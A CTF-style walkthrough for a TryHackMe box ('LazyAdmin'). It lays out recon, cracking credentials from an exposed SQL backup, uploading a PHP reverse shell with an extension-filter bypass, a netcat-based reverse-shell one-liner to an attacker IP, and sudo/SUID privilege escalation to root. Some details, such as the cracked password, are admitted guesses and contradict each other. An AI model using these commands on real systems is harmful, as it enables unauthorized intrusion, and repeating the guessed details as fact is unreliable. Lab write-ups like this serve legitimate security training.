# All steps, commands and notes in one uninterrupted block (copy-paste friendly)
# Goal: user flag + root flag (CTF-style). Replace <IP> with the target IP from THM.

# 1) Recon / Port scan
# Quick nmap to discover services:
nmap -sC -sV -Pn -oN nmap_lazyadmin.txt <IP>

# Expected useful output:
# PORT   STATE SERVICE VERSION
# 22/tcp open  ssh     OpenSSH 7.2p2 (Ubuntu)
# 80/tcp open  http    Apache/2.4.18 (Ubuntu)

#  2) Web enumeration
# Browse http://<IP> -> Default Apache page.
# Run directory brute force against the webpage:
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirb/common.txt -x .php,.html,.txt,.js -o gobuster_top.txt

# Gobuster will reveal: /content
# Now enumerate inside /content:
gobuster dir -u http://<IP>/content -w /usr/share/wordlists/dirb/common.txt -x .php,.html,.txt,.js -o gobuster_content.txt

# Likely results:
# /content/as     (login page)
# /content/inc    (includes/backups etc)
# /content/images, /content/js, /content/_themes, /content/attachments

# --- 3) Inspecting /content/inc
# Visit http://<IP>/content/inc/ and find a backup SQL file (e.g. mysql-backup_*.sql).
# Download it (or curl/wget):
wget http://<IP>/content/inc/mysql-backup_2019*.sql -O mysql_backup.sql

# Inspect the SQL backup for credentials:
grep -i "password" -n mysql_backup.sql
# or open and read:
less mysql_backup.sql

# You should find something like:
# admin: manager
# password hash: 42f749ade7f9e195bf475f37a44cafcb

#  4) Crack the hash
# Identify and crack the hash. It's an MD5 hash of "admin" (or similar) in many writeups.
# Quick check with hash-identifier tools or attempt John/online crack tools.
# Example: use hashcat/john or an online crackstation to recover plaintext:
# hash: 42f749ade7f9e195bf475f37a44cafcb  -> plaintext: "password123" (example)
# (Use the appropriate tool you prefer; some writeups found the cleartext quickly)

# For example with John:
printf "42f749ade7f9e195bf475f37a44cafcb\n" > hash.txt
# create a john format if needed, then:
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt

# After cracking you get a username/password to try on the login page:
# username: manager   password: <CRACKED_PASSWORD>

# --- 5) Login to the web panel & find file upload
# Go to: http://<IP>/content/as/  (admin/login page)
# Use the credentials discovered to log in.
# Look for functionality that allows uploading attachments or creating a post with an attachment.
# If the upload blocks .php, try renaming the file extension.

#  6) Upload a PHP reverse shell
# Download pentestmonkey php-reverse-shell.php and edit:
# set $ip = <YOUR_IP>; $port = <LISTEN_PORT>;
# Save as php-reverse-shell.phtml (or .php5, .pht, etc.) to bypass extension filters.

# Example:
mv php-reverse-shell.php php-reverse-shell.phtml

# Upload via the attachment / create post UI.
# Confirm the file appears under /content/attachments/ or a similar directory (or guess path).

# --- 7) Trigger the shell & get an initial foothold
# Start a netcat listener locally:
nc -lvnp 4444

# Execute the uploaded shell by visiting the uploaded file URL, e.g.:
# http://<IP>/content/attachments/php-reverse-shell.phtml
# Once the shell connects, you get a basic reverse shell.

# Upgrade the shell to a proper tty:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Then in your terminal: Ctrl+Z
stty raw -echo
fg
export TERM=xterm
# Now you have a decent interactive shell.

# --- 8) User flag (enumeration on the box)
# Enumerate the filesystem & users:
id
uname -a
ls -la /home

# Check current user and common locations:
# Often the user flag is in /home/<user>/user.txt
# Example:
ls -la /home
cat /home/itguy/user.txt
# The command above will reveal the user flag:
# USER FLAG: THM{<user_flag_value>}   <-- this is the user flag

# --- 9) Privilege escalation - sudo enumeration
# Check sudo rights:
sudo -l

# Output likely shows something like:
# (root) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl

# So the 'backup.pl' is executable as root via sudo without a password.

# --- 10) Inspect backup.pl and related scripts
# View the script:
cat /home/itguy/backup.pl

# In many writeups, backup.pl calls /etc/copy.sh or otherwise runs a script as root.
# Check /etc/copy.sh:
ls -la /etc/copy.sh
cat /etc/copy.sh

# Typical content: copy /bin/bash to /tmp/bash and chmod +s /tmp/bash (setuid)
# Or it may execute commands that we can abuse by editing copy.sh if writable by our user.

# If copy.sh contains commands that copy /bin/bash to /tmp and chmod it SUID, then:
# After backup.pl runs as root, /tmp/bash will be owned by root and SUID -> we can get root shell.

# --- 11) Exploit method A: Using the existing script behavior
# If /etc/copy.sh creates /tmp/bash with SUID bit, run backup.pl via sudo:
sudo /usr/bin/perl /home/itguy/backup.pl

# After that, if /tmp/bash exists and is SUID root:
ls -l /tmp/bash
# -rwsr-xr-x 1 root root ... /tmp/bash

# Execute the SUID-bash to gain root:
/tmp/bash -p
# Now you're root. Grab root flag:
cat /root/root.txt
# ROOT FLAG: THM{<root_flag_value>}

# --- 12) Exploit method B: If you can edit /etc/copy.sh (alternate)
# If /etc/copy.sh is writable by your user (check with ls -l), you can replace its contents with a payload that gives you a root shell back to your listener.
# Example malicious payload (one-liner reverse shell):
# rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR_IP> <PORT> >/tmp/f

# Steps:
# 1) Edit /etc/copy.sh to contain the reverse shell line (or a line that gives you /bin/bash -p)
# 2) Start your listener (nc -lvnp <PORT>)
# 3) Run sudo /usr/bin/perl /home/itguy/backup.pl  (this runs copy.sh as root)
# 4) Your listener catches a root shell.

# After obtaining root, read the root flag:
cat /root/root.txt
# ROOT FLAG: THM{<root_flag_value>}

# --- 13) Cleanup & notes
# - Replace <YOUR_IP>, <PORT> with your attacker machine IP and chosen port.
# - If the uploaded shell is filtered by extension, try .phtml, .php5, .pht, .txt and then visit the resource.
# - If your shell is unstable, use the python pty spawn trick shown above to stabilise it.
# - If backup.pl runs via sudo as root but calls a script you can edit, modify that script to give you a root shell.
# - Always be responsible: perform these actions only on the lab/box you are authorized to test.

# --- 14) Example quick command summary (copyable)
# nmap -sC -sV -Pn <IP>
# gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirb/common.txt -x .php,.html,.js
# wget http://<IP>/content/inc/mysql-backup_*.sql -O mysql_backup.sql
# john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# nc -lvnp 4444
# python3 -c 'import pty; pty.spawn("/bin/bash")'   # upgrade shell
# sudo -l
# sudo /usr/bin/perl /home/itguy/backup.pl
# cat /home/itguy/user.txt
# cat /root/root.txt

# --- 15) Flags (where you will find them)
# user flag => /home/<user>/user.txt    -> cat /home/itguy/user.txt
# root flag => /root/root.txt            -> cat /root/root.txt

# --- Author block (required)
## Author
# Shivam Singh
# Penetration Tester & Bug Hunter
# GitHub: https://github.com/vgod-sec

# --- Final note (CTF-style)
# You should now be able to retrieve:
# USER FLAG  -> the output of: cat /home/itguy/user.txt   (format: THM{...})
# ROOT FLAG  -> the output of: cat /root/root.txt        (format: THM{...})
